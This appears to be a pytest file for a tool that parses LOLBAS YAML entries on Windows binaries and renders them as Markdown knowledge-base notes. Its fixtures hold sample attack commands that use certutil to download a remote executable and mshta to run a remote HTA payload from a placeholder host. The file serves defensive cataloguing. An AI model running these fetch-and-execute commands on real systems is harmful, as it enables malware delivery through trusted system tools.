from pathlib import Path

import yaml

from src.kb_builder.paths import ProjectPaths
from src.kb_builder.render.markdown import MarkdownRenderer
from src.kb_builder.sources.lolbas import LolbasSource


class DummyLogger:
    def info(self, *args, **kwargs):
        pass

    def warning(self, *args, **kwargs):
        pass

    def debug(self, *args, **kwargs):
        pass


def test_lolbas_source_parses_local_yaml_directory(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    data_dir = tmp_path / "lolbas"
    data_dir.mkdir()
    (data_dir / "Certutil.yml").write_text(
        """
Name: Certutil.exe
Description: Certificate utility that can download files.
Commands:
  - Command: certutil.exe -urlcache -f http://example.test/a.exe a.exe
    Description: Download a remote file.
    Usecase: Download file
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\\Windows\\System32\\certutil.exe
Detection:
  - Look for certutil network connections.
Resources:
  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
Acknowledgement:
  - Example
""",
        encoding="utf-8",
    )

    source = LolbasSource(config={"local_path": "lolbas"}, logger=DummyLogger())
    tools = source.parse(source.load())

    assert len(tools) == 1
    assert tools[0].id == "certutil.exe"
    assert tools[0].path == "kb/lolbas/tools/certutil.exe.md"
    assert tools[0].functions == ["Download"]
    assert tools[0].commands[0].mitre_id == "T1105"


def test_render_lolbas_writes_tool_and_index(tmp_path, monkeypatch):
    repo_root = Path.cwd()
    monkeypatch.chdir(tmp_path)
    data_dir = tmp_path / "lolbas"
    data_dir.mkdir()
    (data_dir / "Mshta.yml").write_text(
        """
Name: Mshta.exe
Description: Execute HTML applications.
Commands:
  - Command: mshta.exe http://example.test/payload.hta
    Usecase: Execute remote HTA
    Category: Execute
    MitreID: T1218.005
Resources:
  - https://lolbas-project.github.io/lolbas/Binaries/Mshta/
Full_Path:
  - Path: C:\\Windows\\System32\\mshta.exe
  - Path: C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\bin\\NETFX Tools\\xsd.exe
Detection:
  - String detection entry.
  - Sigma: https://example.test/sigma.yml
""",
        encoding="utf-8",
    )

    source = LolbasSource(config={"local_path": "lolbas"}, logger=DummyLogger())
    tools = source.parse(source.load())
    monkeypatch.chdir(repo_root)
    renderer = MarkdownRenderer(
        config={"rendering": {"parsed_marker": "focuslocust"}},
        paths=ProjectPaths(
            vault_path=tmp_path / "vault",
            cache_path=tmp_path / ".cache",
            log_path=tmp_path / ".logs",
        ),
        logger=DummyLogger(),
    )

    written, skipped = renderer.render_lolbas(tools)

    assert written == 2
    assert skipped == 0

    tool_note = (tmp_path / "vault/kb/lolbas/tools/mshta.exe.md").read_text(encoding="utf-8")
    assert "parsed_by: focuslocust" in tool_note
    assert "source: lolbas" in tool_note
    assert "# Mshta.exe" in tool_note
    assert "| Execute | Execute remote HTA | `mshta.exe http://example.test/payload.hta` | T1218.005 |" in tool_note
    assert "String detection entry." in tool_note
    assert "https://example.test/sigma.yml" in tool_note
    frontmatter = yaml.safe_load(tool_note.split("---", 2)[1])
    assert set(frontmatter["paths"]) == {
        "C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\bin\\NETFX Tools\\xsd.exe",
        "C:\\Windows\\System32\\mshta.exe",
    }

    index = (tmp_path / "vault/kb/indexes/lolbas.md").read_text(encoding="utf-8")
    assert "[[kb/lolbas/tools/mshta.exe|Mshta.exe]]" in index


def test_renderer_can_read_raw_datasource_field_paths(tmp_path):
    renderer = MarkdownRenderer(
        config={"rendering": {"parsed_marker": "focuslocust"}},
        paths=ProjectPaths(
            vault_path=tmp_path / "vault",
            cache_path=tmp_path / ".cache",
            log_path=tmp_path / ".logs",
        ),
        logger=DummyLogger(),
    )
    raw = {
        "Name": "Certutil.exe",
        "Acknowledgement": [
            {"Person": "Example Person", "Handle": "@example"},
            {"Person": "Second Person", "Handle": "@second"},
        ],
    }

    assert renderer._field_value(raw, "Name") == "Certutil.exe"
    assert renderer._field_values(raw, "Acknowledgement[].Handle") == ["@example", "@second"]
